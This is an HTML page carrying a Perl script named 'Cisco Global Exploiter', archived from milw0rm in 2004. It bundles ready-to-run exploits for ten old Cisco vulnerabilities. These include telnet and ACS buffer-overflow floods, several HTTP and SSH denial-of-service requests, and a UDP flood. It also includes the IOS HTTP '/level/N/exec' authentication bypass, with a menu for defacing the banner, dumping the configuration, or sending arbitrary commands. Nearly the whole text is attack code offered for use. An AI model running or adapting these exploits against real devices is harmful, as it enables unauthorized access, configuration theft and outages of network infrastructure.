<html><head><title>Multiple Cisco Products Vulnerabilities Exploit (Cisco Global Exploiter)
</title></head><pre>#!/usr/bin/perl

##
#   Cisco Global Exploiter
#
#   Legal notes :
#   The BlackAngels staff refuse all responsabilities 
#   for an incorrect or illegal use of this software 
#   or for eventual damages to others systems.
#
#   www blackangels it
##



############
# Modules ##
############

use Socket;
use IO::Socket;


#########
# Main ##
#########

$host = &quot;&quot;;
$expvuln = &quot;&quot;;
$host = @ARGV[ 1 ];
$expvuln = @ARGV[ 3 ];

if ($host eq &quot;&quot;) {
usage();
}
if ($expvuln eq &quot;&quot;) {
usage();
}
if ($expvuln eq &quot;1&quot;) {
cisco1();
} 
elsif ($expvuln eq &quot;2&quot;) {
cisco2();
} 
elsif ($expvuln eq &quot;3&quot;) {
cisco3();
} 
elsif ($expvuln eq &quot;4&quot;) {
cisco4();
} 
elsif ($expvuln eq &quot;5&quot;) {
cisco5();
} 
elsif ($expvuln eq &quot;6&quot;) {
cisco6();
} 
elsif ($expvuln eq &quot;7&quot;) {
cisco7();
} 
elsif ($expvuln eq &quot;8&quot;) {
cisco8();
} 
elsif ($expvuln eq &quot;9&quot;) {
cisco9();
}
elsif ($expvuln eq &quot;10&quot;) {
cisco10();
}
else {
printf &quot;\nInvalid vulnerability number ...\n\n&quot;;
exit(1);
}


##############
# Functions ##
##############

sub usage
{
  printf &quot;\nUsage :\n&quot;;
  printf &quot;perl cge.pl -h &lt;host&gt; -v &lt;vulnerability number&gt;\n\n&quot;;
  printf &quot;Vulnerabilities list :\n&quot;;
  printf &quot;[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability\n&quot;;
  printf &quot;[2] - Cisco IOS Router Denial of Service Vulnerability\n&quot;;
  printf &quot;[3] - Cisco IOS HTTP Auth Vulnerability\n&quot;;
  printf &quot;[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability\n&quot;;
  printf &quot;[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability\n&quot;;
  printf &quot;[6] - Cisco 675 Web Administration Denial of Service Vulnerability\n&quot;;
  printf &quot;[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n&quot;;
  printf &quot;[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability\n&quot;;
  printf &quot;[9] - Cisco 514 UDP Flood Denial of Service Vulnerability\n&quot;;
  printf &quot;[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability\n\n&quot;;
  exit(1);
}

sub cisco1              # Cisco 677/678 Telnet Buffer Overflow Vulnerability
{
  my $serv = $host;
  my $dch = &quot;?????????????????a~                %%%%%XX%%%%%&quot;; 
  my $num = 30000;
  my $string .= $dch x $num; 
  my $shc=&quot;\015\012&quot;;

  my $sockd = IO::Socket::INET-&gt;new (
                                     Proto    =&gt; &quot;tcp&quot;,
                                     PeerAddr =&gt; $serv,
                                     PeerPort =&gt; &quot;(23)&quot;,
                                     ) || die(&quot;No telnet server detected on $serv ...\n\n&quot;);

  $sockd-&gt;autoflush(1);
  print $sockd &quot;$string&quot;. $shc;
  while (&lt;$sockd&gt;){ print }
  print(&quot;\nPacket sent ...\n&quot;);
  sleep(1);
  print(&quot;Now checking server's status ...\n&quot;);
  sleep(2);

  my $sockd2 = IO::Socket::INET-&gt;new (
                                      Proto    =&gt; &quot;tcp&quot;,
                                      PeerAddr =&gt; $serv,
                                      PeerPort =&gt; &quot;(23)&quot;,
                                      ) || die(&quot;Vulnerability successful exploited. Target server is down ...\n\n&quot;);

  print(&quot;Vulnerability unsuccessful exploited. Target server is still up ...\n\n&quot;);   
  exit(1);
}

sub cisco2              # Cisco IOS Router Denial of Service Vulnerability
{
  my $serv = $host;

  my $sockd = IO::Socket::INET-&gt;new (
                                     Proto=&gt;&quot;tcp&quot;,
                                     PeerAddr=&gt;$serv,
                                     PeerPort=&gt;&quot;http(80)&quot;,);
                                     unless ($sockd){die &quot;No http server detected on $serv ...\n\n&quot;};
  $sockd-&gt;autoflush(1);
  print $sockd &quot;GET /\%\% HTTP/1.0\n\n&quot;;
  -close $sockd;
  print &quot;Packet sent ...\n&quot;;
  sleep(1);
  print(&quot;Now checking server's status ...\n&quot;);
  sleep(2);

  my $sockd2 = IO::Socket::INET-&gt;new (
                                      Proto=&gt;&quot;tcp&quot;,
                                      PeerAddr=&gt;$serv,
                                      PeerPort=&gt;&quot;http(80)&quot;,);
                                      unless ($sockd2){die &quot;Vulnerability successful exploited. Target server is down ...\n\n&quot;};

  print(&quot;Vulnerability unsuccessful exploited. Target server is still up ...\n\n&quot;);   
  exit(1);
}

sub cisco3              # Cisco IOS HTTP Auth Vulnerability
{
  my $serv= $host;
  my $n=16;
  my $port=80;
  my $target = inet_aton($serv);
  my $fg = 0;

  LAB: while ($n&lt;100) { 
  my @results=exploit(&quot;GET /level/&quot;.$n.&quot;/exec/- HTTP/1.0\r\n\r\n&quot;);
  $n++;
  foreach $line (@results){
          $line=~ tr/A-Z/a-z/;
          if ($line =~ /http\/1\.0 401 unauthorized/) {$fg=1;}
          if ($line =~ /http\/1\.0 200 ok/) {$fg=0;}
  }  

  if ($fg==1) {
               sleep(2);
               print &quot;Vulnerability unsuccessful exploited ...\n\n\r&quot;;
              }
  else {
        sleep(2);
        print &quot;Vulnerability successful exploited with [http://$serv/level/$n/exec/....] ...\n\n\r&quot;; 
        last LAB; 
       }

  sub exploit {
               my ($pstr)=@_;
               socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
               die(&quot;Unable to initialize socket ...\n\n&quot;);
               if(connect(S,pack &quot;SnA4x8&quot;,2,$port,$target)){
                                                            my @in;
                                                            select(S);      
                                                            $|=1;  
                                                            print $pstr;
                                                            while(&lt;S&gt;){ push @in, $_;}
                                                            select(STDOUT); close(S); return @in;
                                                           } 
  else { die(&quot;No http server detected on $serv ...\n\n&quot;); }
  }
  }    
  exit(1);
}

sub cisco4              # Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability
{
  my $serv = $host;
  my $n = 16;

  while ($n &lt;100) { 
                   exploit1(&quot;GET /level/$n/exec/- HTTP/1.0\n\n&quot;);
                   $wr =~ s/\n//g;
                   if ($wr =~ /200 ok/) { 
                                              while(1)
                                              { print &quot;\nVulnerability could be successful exploited. Please choose a type of attack :\n&quot;;
                                                print &quot;[1] Banner change\n&quot;;
                                                print &quot;[2] List vty 0 4 acl info\n&quot;;
                                                print &quot;[3] Other\n&quot;;
                                                print &quot;Enter a valid option [ 1 - 2 - 3 ] : &quot;;
                                                $vuln = &lt;STDIN&gt;; 
                                                chomp($vuln);

                   if ($vuln == 1) { 
                                    print &quot;\nEnter deface line : &quot;;
                                    $vuln = &lt;STDIN&gt;; 
                                    chomp($vuln);
                                    exploit1(&quot;GET /level/$n/exec/-/configure/-/banner/motd/$vuln HTTP/1.0\n\n&quot;);
                                   }
                   elsif ($vuln == 2) { 
                                       exploit1(&quot;GET /level/$n/exec/show%20conf HTTP/1.0\n\n&quot;); 
                                       print &quot;$wrf&quot;;
                                      } 
                   elsif ($vuln == 3) 
                                      { print &quot;\nEnter attack URL : &quot;;
                                        $vuln = &lt;STDIN&gt;; 
                                        chomp($vuln);
                                        exploit1(&quot;GET /$vuln HTTP/1.0\n\n&quot;);
                                        print &quot;$wrf&quot;;
                                      }
         }
         }
         $wr = &quot;&quot;; 
         $n++;
  }
  die &quot;Vulnerability unsuccessful exploited ...\n\n&quot;;

  sub exploit1 { 
                my $sockd = IO::Socket::INET -&gt; new (
                                                     Proto    =&gt; 'tcp',
                                                     PeerAddr =&gt; $serv,
                                                     PeerPort  =&gt; 80,
                                                     Type      =&gt; SOCK_STREAM,
                                                     Timeout   =&gt; 5);
                                                     unless($sockd){die &quot;No http server detected on $serv ...\n\n&quot;}
  $sockd-&gt;autoflush(1);
  $sockd -&gt; send($_[0]);
  while(&lt;$sockd&gt;){$wr .= $_} $wrf = $wr;
  close $sockd;
  } 
  exit(1);  
}

sub cisco5              # Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability
{
  my $serv = $host; 
  my $port = 22; 
  my $vuln = &quot;a%a%a%a%a%a%a%&quot;;
 
  my $sockd = IO::Socket::INET-&gt;new (
                                     PeerAddr =&gt; $serv,
                                     PeerPort =&gt; $port,
                                     Proto    =&gt; &quot;tcp&quot;)
                                     || die &quot;No ssh server detected on $serv ...\n\n&quot;;

  print &quot;Packet sent ...\n&quot;;
  print $sockd &quot;$vuln&quot;;
  close($sockd);
  exit(1);
}

sub cisco6              # Cisco 675 Web Administration Denial of Service Vulnerability
{
  my $serv = $host; 
  my $port = 80; 
  my $vuln = &quot;GET ? HTTP/1.0\n\n&quot;;
 
  my $sockd = IO::Socket::INET-&gt;new (
                                     PeerAddr =&gt; $serv,
                                     PeerPort =&gt; $port,
                                     Proto    =&gt; &quot;tcp&quot;)
                                     || die &quot;No http server detected on $serv ...\n\n&quot;;

  print &quot;Packet sent ...\n&quot;;
  print $sockd &quot;$vuln&quot;;
  sleep(2);
  print &quot;\nServer response :\n\n&quot;;
  close($sockd);   
  exit(1);
}

sub cisco7              # Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability
{
  my $serv = $host; 
  my $port = 80; 
  my $k = &quot;&quot;;
  
  print &quot;Enter a file to read [ /show/config/cr set as default ] : &quot;;
  $k = &lt;STDIN&gt;;
  chomp ($k);
  if ($k eq &quot;&quot;)
  {$vuln = &quot;GET /exec/show/config/cr HTTP/1.0\n\n&quot;;}
  else
  {$vuln = &quot;GET /exec$k HTTP/1.0\n\n&quot;;}

  my $sockd = IO::Socket::INET-&gt;new (
                                     PeerAddr =&gt; $serv,
                                     PeerPort =&gt; $port,
                                     Proto    =&gt; &quot;tcp&quot;)
                                     || die &quot;No http server detected on $serv ...\n\n&quot;;

  print &quot;Packet sent ...\n&quot;;
  print $sockd &quot;$vuln&quot;;
  sleep(2);
  print &quot;\nServer response :\n\n&quot;;
  while (&lt;$sockd&gt;){print}
  close($sockd);   
  exit(1);
}

sub cisco8              # Cisco IOS Software HTTP Request Denial of Service Vulnerability 
{
  my $serv = $host; 
  my $port = 80; 
  my $vuln = &quot;GET /error?/ HTTP/1.0\n\n&quot;;

  my $sockd = IO::Socket::INET-&gt;new (
                                     PeerAddr =&gt; $serv,
                                     PeerPort =&gt; $port,
                                     Proto    =&gt; &quot;tcp&quot;)
                                     || die &quot;No http server detected on $serv ...\n\n&quot;;

  print &quot;Packet sent ...\n&quot;;
  print $sockd &quot;$vuln&quot;;
  sleep(2);
  print &quot;\nServer response :\n\n&quot;;
  while (&lt;$sockd&gt;){print}
  close($sockd);   
  exit(1);
}

sub cisco9              # Cisco 514 UDP Flood Denial of Service Vulnerability
{
  my $ip = $host;
  my $port = &quot;514&quot;;
  my $ports = &quot;&quot;; 
  my $size = &quot;&quot;;
  my $i = &quot;&quot;;

  print &quot;Input packets size : &quot;;
  $size = &lt;STDIN&gt;; 
  chomp($size);

  socket(SS, PF_INET, SOCK_DGRAM, 17);
  my $iaddr = inet_aton(&quot;$ip&quot;);

  for ($i=0; $i&lt;10000; $i++) 
  {send(SS, 0, $size, sockaddr_in($port, $iaddr));}

  printf &quot;\nPackets sent ...\n&quot;;
  sleep(2);
  printf &quot;Please enter a server's open port : &quot;;
  $ports = &lt;STDIN&gt;;
  chomp $ports;
  printf &quot;\nNow checking server status ...\n&quot;;
  sleep(2);

  socket(SO, PF_INET, SOCK_STREAM, getprotobyname('tcp')) || die &quot;An error occuring while loading socket ...\n\n&quot;;
  my $dest = sockaddr_in ($ports, inet_aton($ip));
  connect (SO, $dest) || die &quot;Vulnerability successful exploited. Target server is down ...\n\n&quot;;

  printf &quot;Vulnerability unsuccessful exploited. Target server is still up ...\n\n&quot;;
  exit(1);
}

sub cisco10             # CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability
{
  my $ip = $host;
  my $vln = &quot;%%%%%XX%%%%%&quot;; 
  my $num = 30000;
  my $string .= $vln x $num; 
  my $shc=&quot;\015\012&quot;;

  my $sockd = IO::Socket::INET-&gt;new (
                                     Proto       =&gt; &quot;tcp&quot;,
                                     PeerAddr    =&gt; $ip,
                                     PeerPort    =&gt; &quot;(2002)&quot;,
                                    ) || die &quot;Unable to connect to $ip:2002 ...\n\n&quot;;

  $sockd-&gt;autoflush(1);
  print $sockd &quot;$string&quot; . $shc;
  while (&lt;$sockd&gt;){ print }
  print &quot;Packet sent ...\n&quot;;
  close($sockd);
  sleep(1);
  print(&quot;Now checking server's status ...\n&quot;);
  sleep(2);

  my $sockd2 = IO::Socket::INET-&gt;new (
                                      Proto=&gt;&quot;tcp&quot;,
                                      PeerAddr=&gt;$ip,
                                      PeerPort=&gt;&quot;(2002)&quot;,);
                                      unless ($sockd){die &quot;Vulnerability successful exploited. Target server is down ...\n\n&quot;};

  print(&quot;Vulnerability unsuccessful exploited. Target server is still up ...\n\n&quot;);   
  exit(1);
} 


# milw0rm.com [2004-03-28]</pre></html>